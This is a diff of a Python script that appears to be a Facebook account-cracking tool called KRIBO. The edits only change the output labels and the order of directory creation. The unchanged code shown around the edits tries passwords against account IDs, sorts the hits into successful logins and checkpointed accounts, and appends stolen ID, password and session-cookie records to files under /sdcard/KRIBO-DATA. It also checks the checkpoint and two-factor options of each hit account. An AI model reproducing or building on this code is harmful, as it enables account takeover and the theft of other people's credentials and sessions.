@@ -975,10 +975,10 @@ def crack(idf,pwv,nmf):
 				elif 'ya' in princp:
 					print('\n')
 					try:
-						statuscp = f'\r[🌹] ID       : {idf} \n[🌹] PW : {pw} \n[🌹] NAME : {nmf}\n[🌹] BIRTHDAY : {ttl}'
+						statuscp = f'\r[🌹] ID       : {idf} \n🌹 {pw} \n[🌹] NAME : {nmf}\n[🌹] BIRTHDAY : {ttl}'
 						open('/sdcard/KRIBO-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'|'+ttl+'\n')
 					except:
-						statuscp = f'\r[🌹] ID       : {idf} \n[🌹] PW : {pw} \n[🌹] NAME : {nmf}'
+						statuscp = f'\r[🌹] ID       : {idf} \n🌹 {pw} \n[🌹] NAME : {nmf}'
 						open('/sdcard/KRIBO-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					statuscp1 = nel(statuscp, style='blue')
 					cetak(nel(statuscp1, title='KRIBO-CP'))
@@ -992,7 +992,7 @@ def crack(idf,pwv,nmf):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					open('/sdcard/KRIBO-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
-					statusok = f'[🌹] ID       : {idf}\n[🌹] PW : {pw}\n[🌹] COOKIES  : {kuki}'
+					statusok = f'[🌹] ID       : {idf}\n🌹 {pw}\n[🌹] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, style='green')
 					cetak(nel(statusok1, title='KRIBO-OK'))
 					ok+=1
@@ -1050,7 +1050,7 @@ def crack(idf,pwv,nmf):
 						hit+=1
 						infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")
 					print('\n')
-					statusok = f'[bold green]\r[🌹] ID       : {idf}\n[🌹] PW : {pw}\n[🌹] COOKIES  : {kuki}[/bold green]\n{infoakun}'
+					statusok = f'[bold green]\r[🌹] ID       : {idf}\n🌹 {pw}\n[🌹] COOKIES  : {kuki}[/bold green]\n{infoakun}'
 					statusok1 = nel(statusok, style='green')
 					cetak(nel(statusok1, title='[bold green]KRIBO-OK[/bold green]'))
 					ok+=1
@@ -1090,7 +1090,7 @@ def crackfree(idf,pwv):
 					ceker(idf,pw)
 				elif 'ya' in princp:
 					print('\n')
-					statuscp = f'[🌹] ID       : {idf} [🌹] PW : {pw}'
+					statuscp = f'[🌹] ID       : {idf} 🌹 {pw}'
 					statuscp1 = nel(statuscp, style='blue')
 					cetak(nel(statuscp1, title='KRIBO-CP'))
 					open('/sdcard/KRIBO-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -1105,7 +1105,7 @@ def crackfree(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					open('/sdcard/KRIBO-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
-					statusok = f'[🌹] ID       : {idf}\n[🌹] PW : {pw}\n[🌹] COOKIES  : {kuki}'
+					statusok = f'[🌹] ID       : {idf}\n🌹 {pw}\n[🌹] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, style='green')
 					cetak(nel(statusok1, title='KRIBO-OK'))
 					ok+=1
@@ -1134,7 +1134,7 @@ def crackfree(idf,pwv):
 						hit+=1
 						infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")
 					print('\n')
-					statusok = f'[bold green][🌹] ID       : {idf}\n[🌹] PW : {pw}\n[🌹] COOKIES  : {kuki}[/bold green]\n{infoakun}'
+					statusok = f'[bold green][🌹] ID       : {idf}\n🌹 {pw}\n[🌹] COOKIES  : {kuki}[/bold green]\n{infoakun}'
 					statusok1 = nel(statusok, style='green')
 					cetak(nel(statusok1, title='[bold green]KRIBO-OK[/bold green]'))
 					ok+=1
@@ -1174,7 +1174,7 @@ def cracktouch(idf,pwv):
 					ceker(idf,pw)
 				elif 'ya' in princp:
 					print('\n')
-					statuscp = f'[🌹] ID       : {idf} [🌹] PW : {pw}'
+					statuscp = f'[🌹] ID       : {idf} 🌹 {pw}'
 					statuscp1 = nel(statuscp, style='blue')
 					cetak(nel(statuscp1, title='KRIBO-CP'))
 					open('/sdcard/KRIBO-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -1189,7 +1189,7 @@ def cracktouch(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					open('/sdcard/KRIBO-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
-					statusok = f'[🌹] ID       : {idf}\n[🌹] PW : {pw}\n[🌹] COOKIES  : {kuki}'
+					statusok = f'[🌹] ID       : {idf}\n🌹 {pw}\n[🌹] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, style='green')
 					cetak(nel(statusok1, title='KRIBO-OK'))
 					ok+=1
@@ -1218,7 +1218,7 @@ def cracktouch(idf,pwv):
 						hit+=1
 						infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")
 					print('\n')
-					statusok = f'[bold green][🌹] ID       : {idf}\n[🌹] PW : {pw}\n[🌹] COOKIES  : {kuki}[/bold green]\n{infoakun}'
+					statusok = f'[bold green][🌹] ID       : {idf}\n🌹 {pw}\n[🌹] COOKIES  : {kuki}[/bold green]\n{infoakun}'
 					statusok1 = nel(statusok, style='green')
 					cetak(nel(statusok1, title='[bold green]KRIBO-OK[/bold green]'))
 					ok+=1
@@ -1257,7 +1257,7 @@ def crackmbasic(idf,pwv):
 					ceker(idf,pw)
 				elif 'ya' in princp:
 					print('\n')
-					statuscp = f'[🌹] ID       : {idf} [🌹] PW : {pw}'
+					statuscp = f'[🌹] ID       : {idf} 🌹 {pw}'
 					statuscp1 = nel(statuscp, style='blue')
 					cetak(nel(statuscp1, title='KRIBO-CP'))
 					open('/sdcard/KRIBO-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -1272,7 +1272,7 @@ def crackmbasic(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					open('/sdcard/KRIBO-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
-					statusok = f'[🌹] ID       : {idf}\n[🌹] PW : {pw}\n[🌹] COOKIES  : {kuki}'
+					statusok = f'[🌹] ID       : {idf}\n🌹 {pw}\n[🌹] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, style='green')
 					cetak(nel(statusok1, title='KRIBO-OK'))
 					ok+=1
@@ -1301,7 +1301,7 @@ def crackmbasic(idf,pwv):
 						hit+=1
 						infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")
 					print('\n')
-					statusok = f'[bold green][🌹] ID       : {idf}\n[🌹] PW : {pw}\n[🌹] COOKIES  : {kuki}[/bold green]\n{infoakun}'
+					statusok = f'[bold green][🌹] ID       : {idf}\n🌹 {pw}\n[🌹] COOKIES  : {kuki}[/bold green]\n{infoakun}'
 					statusok1 = nel(statusok, style='green')
 					cetak(nel(statusok1, title='[bold green]KRIBO-OK[/bold green]'))
 					ok+=1
@@ -1378,16 +1378,16 @@ def cekopsii(id,pw,ttl):
 					if opsinya=='':
 						try:
 							open('/sdcard/KRIBO-DATA/TAP-A2F/'+tpc,'a').write(id+'|'+pw+'|'+ttl+'\n')
-							statusok = f'\r[🌹] ID       : {id}\n[🌹] PW : {pw}\n[🌹] BIRTHDAY : {ttl}\n[🌹] CHECKPOINT OPTION   : TAP YES / A2F ON (LOGIN MBASIC)'
+							statusok = f'\r[🌹] ID       : {id}\n🌹 {pw}\n[🌹] BIRTHDAY : {ttl}\n[🌹] CHECKPOINT OPTION   : TAP YES / A2F ON (LOGIN MBASIC)'
 						except:
 							open('/sdcard/KRIBO-DATA/TAP-A2F/'+tpc,'a').write(id+'|'+pw+'\n')
-							statusok = f'\r[🌹] ID       : {id}\n[🌹] PW : {pw}\n[🌹] CHECKPOINT OPTION   : TAP YES / A2F ON (LOGIN MBASIC)'
+							statusok = f'\r[🌹] ID       : {id}\n🌹 {pw}\n[🌹] CHECKPOINT OPTION   : TAP YES / A2F ON (LOGIN MBASIC)'
 					else:
 						try:
-							statusok = f'\r[🌹] ID       : {id}\n[🌹] PW : {pw}\n[🌹] BIRTHDAY : {ttl}\n[🌹] CHECKPOINT OPTION   :\n {opsinya}'
+							statusok = f'\r[🌹] ID       : {id}\n🌹 {pw}\n[🌹] BIRTHDAY : {ttl}\n[🌹] CHECKPOINT OPTION   :\n {opsinya}'
 							open('/sdcard/KRIBO-DATA/CP/'+cpc,'a').write(id+'|'+pw+'|'+ttl+'\n')
 						except:
-							statusok = f'\r[🌹] ID       : {id}\n[🌹] PW : {pw}\n[🌹] CHECKPOINT OPTION   :\n {opsinya}'
+							statusok = f'\r[🌹] ID       : {id}\n🌹 {pw}\n[🌹] CHECKPOINT OPTION   :\n {opsinya}'
 							open('/sdcard/KRIBO-DATA/CP/'+cpc,'a').write(id+'|'+pw+'\n')
 					statusok1 = nel(statusok, style='yellow')
 					cetak(nel(statusok1, title='CHECKPOINT OPTION'))
@@ -1397,16 +1397,16 @@ def cekopsii(id,pw,ttl):
 					exit()
 			elif "c_user" in req.cookies.get_dict().keys():
 				try:
-					statusok = f'\r[🌹] ID       : {id}\n[🌹] PW : {pw}\n[🌹] BIRTHDAY : {ttl}\n[🌹] CHECKPOINT OPTION   :\n {opsinya}'
+					statusok = f'\r[🌹] ID       : {id}\n🌹 {pw}\n[🌹] BIRTHDAY : {ttl}\n[🌹] CHECKPOINT OPTION   :\n {opsinya}'
 				except:
-					statusok = f'\r[🌹] ID       : {id}\n[🌹] PW : {pw}'
+					statusok = f'\r[🌹] ID       : {id}\n🌹 {pw}'
 				statusok1 = nel(statusok, style='yellow')
 				cetak(nel(statusok1, title='CHECKPOINT OPTION'))
 				open('/sdcard/KRIBO-DATA/OK/'+okc,'a').write(id+'|'+pw+'\n')
 
 			else:
 				print('\n\r')
-				statusok = f'\r[🌹] ID : {id} [🌹] PW : {pw}'
+				statusok = f'\r[🌹] ID : {id} 🌹 {pw}'
 				statusok1 = nel(statusok, style='red')
 				cetak(nel(statusok1, title='WRONG PASSWORD'))
 		except requests.exceptions.ConnectionError:
@@ -1415,9 +1415,9 @@ def cekopsii(id,pw,ttl):
 			sol().print(mark(li, style='red'))
 			exit()
 if __name__=='__main__':
-	try:os.mkdir('/sdcard/KRIBO-DATA/CP')
-	except:pass
 	try:os.mkdir('/sdcard/KRIBO-DATA/OK')
+	except:pass
+	try:os.mkdir('/sdcard/KRIBO-DATA/CP')
 	except:pass
 	try:os.mkdir('/sdcard/KRIBO-DATA/DUMP')
 	except:pass
